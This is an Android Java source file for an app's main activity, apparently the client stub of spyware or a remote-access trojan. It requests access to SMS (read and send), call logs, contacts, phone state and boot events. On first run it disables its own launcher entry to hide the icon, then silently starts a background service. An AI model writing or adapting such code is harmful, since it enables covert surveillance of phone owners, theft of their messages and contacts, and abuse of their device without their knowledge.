package com.example.client;

import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.preference.PreferenceManager;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;


public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        checkPermission();
        SharedPreferences wmbPreference = PreferenceManager.getDefaultSharedPreferences(this);
        boolean isFirstRun = wmbPreference.getBoolean("FIRSTRUN", true);
        if (isFirstRun)
        {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            Intent st = new Intent(this,MyService.class);
            startService(st);
            finish();
            SharedPreferences.Editor editor = wmbPreference.edit();
            editor.putBoolean("FIRSTRUN", false);
            editor.commit();
        }else {
            Intent st = new Intent(this,MyService.class);
            startService(st);
            finish();
        }
    }

    public void checkPermission()
    {
        int PERMISSION_ALL = 1;
        String[] PERMISSIONS = {
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.SET_WALLPAPER,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.FOREGROUND_SERVICE,
        };
        if (!hasPermissions(this, PERMISSIONS)) {
            ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
        }

    }
    public static boolean hasPermissions(Context context, String... permissions) {
    if (context != null && permissions != null) {
        for (String permission : permissions) {
            if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
    }
    return true;
}

}
